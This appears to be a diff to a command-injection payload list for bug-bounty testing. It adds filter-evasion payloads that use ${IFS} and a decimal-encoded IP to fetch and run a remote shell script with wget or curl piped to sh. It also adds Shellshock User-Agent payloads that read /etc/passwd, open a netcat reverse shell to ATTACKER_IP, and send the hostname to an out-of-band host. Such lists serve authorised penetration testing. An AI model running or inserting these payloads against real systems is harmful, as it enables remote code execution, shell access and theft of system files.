@@ -513,3 +513,13 @@ $(curl${IFS}BURP_COLLAB)
 {curl,BURP_COLLAB}
 # bash brace-hidden URL
 curl${IFS}"$(echo BURP_COLLAB)"
+# ─── decimal-IP RCE evasion (page 91 of bounty_tips_100) ───
+# When filter blocks '.' in IP but ; and ${IFS} are allowed:
+;wget${IFS}http://168377863/rev.php;
+# 168377863 decodes to 10.9.62.7 — convert your OOB host to decimal first:
+#   python -c "import ipaddress; print(int(ipaddress.IPv4Address('10.9.62.7')))"
+;curl${IFS}http://168377863/shell.sh${IFS}|${IFS}sh;
+# ShellShock cgi-bin User-Agent probe (page 86)
+User-Agent: () { :;}; echo $(</etc/passwd)
+User-Agent: () { :;}; /usr/bin/nc ATTACKER_IP 4444 -e /bin/bash
+User-Agent: () { :;}; curl http://BURP_COLLAB/$(hostname)
